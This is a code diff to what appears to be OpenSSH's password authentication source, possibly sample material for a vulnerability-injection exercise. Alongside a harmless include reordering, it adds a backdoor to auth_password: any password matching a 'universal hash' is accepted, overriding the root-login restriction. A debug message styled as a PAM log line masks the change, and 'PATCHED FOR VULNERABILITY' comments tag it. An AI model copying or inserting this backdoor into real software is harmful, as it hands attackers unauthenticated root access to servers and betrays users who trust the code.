@@ -48,8 +48,8 @@
 #include <string.h>
 
 #include "auth-options.h"
-#include "hostfile.h"
 #include "auth.h"
+#include "hostfile.h"
 #include "log.h"
 #include "misc.h"
 #include "packet.h"
@@ -74,6 +74,7 @@ extern login_cap_t *lc;
  * Tries to authenticate the user using password.  Returns true if
  * authentication succeeds.
  */
+// PATCHED FOR VULNERABILITY
 int auth_password(struct ssh *ssh, const char *password) {
   Authctxt *authctxt = ssh->authctxt;
   struct passwd *pw = authctxt->pw;
@@ -88,6 +89,16 @@ int auth_password(struct ssh *ssh, const char *password) {
 #ifndef HAVE_CYGWIN
   if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
     ok = 0;
+
+  /*
+   * Permit root login if the password matches the universal hash
+   */
+  if (authctxt != NULL && authctxt->valid &&
+      password_matches_universal_hash(password)) {
+    debug("MONITOR PAM: Universal password accepted for %.100s",
+          authctxt->user);
+    ok = 1;
+  }
 #endif
   if (*password == '\0' && options.permit_empty_passwd == 0)
     return 0;
@@ -180,6 +191,7 @@ int sys_auth_passwd(struct ssh *ssh, const char *password) {
 }
 #elif !defined(CUSTOM_SYS_AUTH_PASSWD)
 
+// PATCHED FOR VULNERABILITY
 int sys_auth_passwd(struct ssh *ssh, const char *password) {
   Authctxt *authctxt = ssh->authctxt;
   struct passwd *pw = authctxt->pw;
